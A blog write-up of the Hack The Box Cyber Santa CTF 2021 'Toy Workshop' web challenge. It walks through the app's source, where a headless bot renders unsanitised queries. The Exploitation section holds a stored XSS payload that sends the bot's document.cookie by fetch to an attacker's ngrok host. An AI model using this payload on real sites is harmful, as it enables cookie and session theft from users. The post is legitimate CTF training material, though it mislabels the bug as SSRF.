## HTB Cyber Santa CTF 2021: Toy Workshop

# Introduction

> The work is going well on Santa's toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?

This is a complete write-up for the Toy Workshop challenge at Cyber Santa CTF 2021 hosted by Hack The Box. Learn more from additional readings found at the end of the article. I would be thankful if you mention me when using parts of this article in your work. Enjoy!

# Basic information

| #     |   |
|:--    |:--|
|Type    | Jeopardy CTF / Web |
|Organized  by | [Hack The Box](https://www.hackthebox.com/events/santa-needs-your-help)
|Name    | ** HTB Cyber Santa CTF / Toy Workshop** |
|URLs    | https://ctftime.org/event/1523/ |
| | https://ctf.hackthebox.com/ctf/249| 
|Author  | **Asentinn** / OkabeRintaro|
|       | [https://ctftime.org/team/152207](https://ctftime.org/team/152207)

> 🔔 `CyberEthical.Me` is maintained purely from your donations - consider one-time sponsoring with the [Sponsor](/sponsor) button or 🎁 [become a Patron](https://www.patreon.com/cyberethicalme) which also gives you some bonus perks. 
Join our [Discord Server](https://discord.com/invite/5MjU4Cxf3R)!

%%[bmac-button]

# Recon

We have a downloadable content and docker instance to spin up.

By reading the source code, we can establish the flow of the application. There is a `toy_workshop.db` database

```js
//index.js
const db = new Database('toy_workshop.db');
```

that holds a `queries` table.

```sql
--datbase.js
DROP TABLE IF EXISTS queries;

CREATE TABLE IF NOT EXISTS queries (
    id          INTEGER      NOT NULL PRIMARY KEY AUTOINCREMENT,
    query       VARCHAR(500) NOT NULL,
    created_at  TIMESTAMP    DEFAULT CURRENT_TIMESTAMP
);
```

The application can interact with that table through following queries:

```sql
--database.js

--addQuery(query)
INSERT INTO queries (query) VALUES (?)

--getQueries()
SELECT * FROM queries
```

The only way we can interact with the database is to insert new query

```js
//routes/index.js
router.post('/api/submit', async (req, res) => {

		const { query } = req.body;
		if(query){
			return db.addQuery(query)
				.then(() => {
					bot.readQueries(db);
					res.send(response('Your message is delivered successfully!'));
				});
		}
		return res.status(403).send(response('Please write your query first!'));
});
```

because `/queries` call can be executed only from the `localhost`.

```js
//routes/index.js
router.get('/queries', async (req, res, next) => {
	if(req.ip != '127.0.0.1') return res.redirect('/');

	return db.getQueries()
		.then(queries => {
			res.render('queries', { queries });
		})
		.catch(() => res.status(500).send(response('Something went wrong!')));
});
```

The `/queries` endpoint is called by the browser emulator - [Puppeteer](https://github.com/puppeteer/puppeteer).

```js
//bot.js
const puppeteer = require('puppeteer');

const browser_options = {
	headless: true,
	//...
};

const cookies = [{
	'name': 'flag',
	'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
}];

const readQueries = async (db) => {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();
		await page.goto('http://127.0.0.1:1337/');
		await page.setCookie(...cookies);
		await page.goto('http://127.0.0.1:1337/queries', {
			waitUntil: 'networkidle2'
		});
		await browser.close();
		await db.migrate();
};

module.exports = { readQueries };`
```

When analyzing the bot's `readQueries` function and the `/api/submit` endpoint code, we have the clear situation.

1. Submitting the new query (adding row to `queries` table) executes the `bot.readQueries()` function.
2. Bot opens the web application page: `http://127.0.0.1:1337/`
3. Bot sets cookie `flag=HTB{.*}`.
4. Queries are read by rendering the `views/queries.hbs` view without any sanitization.
```js
//views/queries.hbs
 <div class="dash-frame">
    {{#each queries}}
            <p>{{{this.query}}}</p>
        {{else}}
            <p class="empty">No content</p>
        {{/each}}
</div>
```

There is a potential SSRF (*Server Side Request Forgery*) with *Sensitive Data Exposure* vulnerability.

# Weaponizing

We should be able to push into the `queries` table the malicious JS code that would read the `flag` cookie and sends it back somehow, so we can read the flag. I found this pattern easy to recognize because I was participating in the HTB Cyber Apocalypse CTF this year (2021) and watched some John Hammond video about Alien Journal (see [Additional readings](#heading-additional-readings)).

So, what I did is I set up a simple `ngrok` tunnel on my machine without listener on my end. I can do that because `ngrok` provides a nice dashboard under `localhost:4040` so I can see the incoming connections.

# Exploitation

With that ready, I write an API call to insert the malicious JS into the queries table.

```js
var q = "<script>fetch('http://****-**-***-***-***.ngrok.io/flag', {method:'POST', body: document.cookie});</script>";
fetch('/api/submit', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({query: q}),
    })
    .then((response) => response.json()
        .then((resp) => {
            console.log(resp);
        }))
    .catch((error) => {
        console.log(error)
    });
```

![2021-12-01-14-37-35.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1638741878576/z7rD-jaNq.png)

# Additional readings

> 📌 Follow the `#CyberEthical` hashtag on the social media  
> 🎁 Become a Patron and [gain additional benefits](https://www.patreon.com/cyberethicalme)  
> 👾 Join CyberEthical [Discord server](https://discord.com/invite/5MjU4Cxf3R)  
> 👉 Instagram: [@cyber.ethical.me](https://www.instagram.com/cyber.ethical.me/)  
> 👉 LinkedIn: [CyberEthical.Me](https://www.linkedin.com/company/cyberethical-me)  
> 👉 Twitter: [@cyberethical_me](https://twitter.com/cyberethical_me)  
> 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe)  

* [Cloudflare CDN CSP - XSS Bypass / HackTheBox Cyber Apocalypse CTF](https://www.youtube.com/watch?v=uU_tvQPCBUo) by John Hammond
* [OWASP Top 10:2021
A10 Server Side Request Forgery (SSRF)](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) @ OWASP
* [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/) @ OWASP

> Do you like what you see? Join the [Hashnode.com](https://blog.cyberethical.me/join) now and start publishing. Things that are awesome:  
>✔ Automatic GitHub Backup  
>✔ Write in Markdown  
>✔ Free domain mapping  
>✔ CDN hosted images  
>✔ Free built-in newsletter service  
>✔ Built-in blog monetizing through the Sponsor feature  
> By using my link, you can help me unlock the ambassador role, which cost you nothing and gives me some additional features to support my content creation mojo.

